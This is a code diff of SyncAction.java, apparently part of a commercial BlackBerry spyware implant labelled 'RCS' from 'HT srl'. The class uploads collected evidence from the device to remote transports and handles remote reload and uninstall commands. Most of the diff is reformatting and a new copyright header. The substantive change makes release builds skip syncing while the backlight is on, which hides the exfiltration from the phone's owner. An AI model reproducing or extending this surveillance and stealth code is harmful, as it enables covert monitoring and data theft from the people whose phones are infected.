@@ -1,4 +1,12 @@
 //#preprocess
+
+/* *************************************************
+ * Copyright (c) 2010 - 2011
+ * HT srl,   All rights reserved.
+ * 
+ * Project      : RCS, RCSBlackBerry
+ * *************************************************/
+	
 package blackberry.action.sync;
 
 import java.util.Vector;
@@ -27,19 +35,18 @@ public abstract class SyncAction extends SubAction {
     protected boolean initialized;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("SyncAction",
-            DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
     //#endif
-    
+
     public SyncAction(int actionId, final byte[] confParams) {
         super(actionId);
 
         logCollector = EvidenceCollector.getInstance();
         agentManager = AgentManager.getInstance();
         transports = new Vector();
-        
+
         protocol = new ZProtocol();
-        initialized = parse(confParams);        
+        initialized = parse(confParams);
         initialized &= initTransport();
     }
 
@@ -63,12 +70,11 @@ public abstract class SyncAction extends SubAction {
             return false;
         }
 
+        //#ifndef DEBUG
         if (Backlight.isEnabled()) {
-            //#ifdef DEBUG
-            debug.warn("SyncAction - no sync, backlight enabled");
-            //#endif
             return false;
         }
+        //#endif
 
         wantReload = false;
         wantUninstall = false;
@@ -79,7 +85,7 @@ public abstract class SyncAction extends SubAction {
 
         for (int i = 0; i < transports.size(); i++) {
             Transport transport = (Transport) transports.elementAt(i);
-            
+
             //#ifdef DEBUG
             debug.trace("execute transport: " + transport);
             debug.trace("transport Sync url: " + transport.getUrl());
@@ -93,7 +99,7 @@ public abstract class SyncAction extends SubAction {
 
                 try {
                     //#ifdef DEBUG
-                    debug.ledStart(Debug.COLOR_YELLOW);
+                    debug.ledFlash(Debug.COLOR_YELLOW);
                     //#endif
 
                     ret = protocol.perform();
@@ -104,12 +110,7 @@ public abstract class SyncAction extends SubAction {
                     debug.error(e);
                     //#endif
                     ret = false;
-                } finally {
-                    //#ifdef DEBUG
-                    debug.ledStop();
-                    //#endif
-                }
-
+                } 
                 //#ifdef DEBUG
                 debug.trace("execute protocol: " + ret);
                 //#endif
@@ -133,13 +134,14 @@ public abstract class SyncAction extends SubAction {
             //#ifdef DEBUG
             debug.error("SyncAction Unable to perform");
             //#endif
-            
+
         }
-        
+
         return false;
     }
-    
-    protected abstract boolean parse(final byte[] confParams) ;
-    protected abstract boolean initTransport() ;
+
+    protected abstract boolean parse(final byte[] confParams);
+
+    protected abstract boolean initTransport();
 
 }
